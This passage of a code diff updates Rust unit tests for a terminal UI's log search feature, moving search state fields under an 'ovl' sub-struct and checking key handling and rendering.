         // 同时让过滤生效（Enter 提交）。
         app.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::empty()));
-        assert_eq!(app.search_query.as_deref(), Some("err"));
-        assert!(app.search_input.is_none(), "Enter 后退出输入态");
+        assert_eq!(app.ovl.search_query.as_deref(), Some("err"));
+        assert!(app.ovl.search_input.is_none(), "Enter 后退出输入态");
         // Esc 清空。
         // 重新进入输入态再 Esc。
-        app.search_input = Some("x".into());
+        app.ovl.search_input = Some("x".into());
         app.handle_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::empty()));
-        assert!(app.search_input.is_none(), "Esc 退出输入态");
-        assert!(app.search_query.is_none(), "Esc 清空 search_query");
+        assert!(app.ovl.search_input.is_none(), "Esc 退出输入态");
+        assert!(app.ovl.search_query.is_none(), "Esc 清空 search_query");
     }
 
     /// 搜索过滤只影响显示：底层 stream 仍持有全部行。
@@ -4189,7 +2544,7 @@ mod tests {
         app.log("info two", Level::Info);
         app.log("error three", Level::Err);
         let total = app.stream.len();
-        app.search_query = Some("error".into());
+        app.ovl.search_query = Some("error".into());
         // 不直接读渲染，但确认 stream 完整。
         assert_eq!(app.stream.len(), total, "stream 不应被过滤改动");
         // 计数匹配（render_stream_content 的过滤逻辑镜像）。
@@ -4207,7 +2562,7 @@ mod tests {
     fn render_search_bar_input_mode_no_panic() {
         let mut app = fake_app();
         app.log("hello", Level::Info);
-        app.search_input = Some("hel".into());
+        app.ovl.search_input = Some("hel".into());
         let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
         let buf_str: String = term
@@ -4225,7 +2580,7 @@ mod tests {
     fn render_search_bar_filter_mode_no_panic() {
         let mut app = fake_app();
         app.log("target line", Level::Ok);
-        app.search_query = Some("target".into());
+        app.ovl.search_query = Some("target".into());
         let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
         let buf_str: String = term
